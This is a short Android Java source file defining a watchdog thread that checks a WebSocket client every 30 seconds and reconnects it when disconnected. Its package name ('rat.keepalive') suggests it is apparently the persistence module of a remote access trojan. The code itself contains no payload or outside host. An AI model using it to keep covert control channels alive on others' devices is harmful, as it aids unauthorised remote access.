package com.vendor.rat.keepalive.thread;

import android.util.Log;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;

/**
 * 进程存活检查线程 (模块 07)
 *
 * 每 30 秒检查核心服务和线程是否存活
 */
public class CheckThread extends Thread {

    private static final String TAG = "CheckThread";
    private volatile boolean running = true;
    private static final long CHECK_INTERVAL = 30 * 1000L;

    public CheckThread() {
        super("check-thread");
    }

    @Override
    public void run() {
        while (running) {
            try {
                checkWebSocket();
                Thread.sleep(CHECK_INTERVAL);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.e(TAG, "Check error", e);
            }
        }
    }

    private void checkWebSocket() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null && !wsClient.isConnected()) {
            Log.w(TAG, "WebSocket disconnected, reconnecting");
            wsClient.reconnect();
        }
    }

    public void stopChecking() {
        running = false;
        interrupt();
    }
}
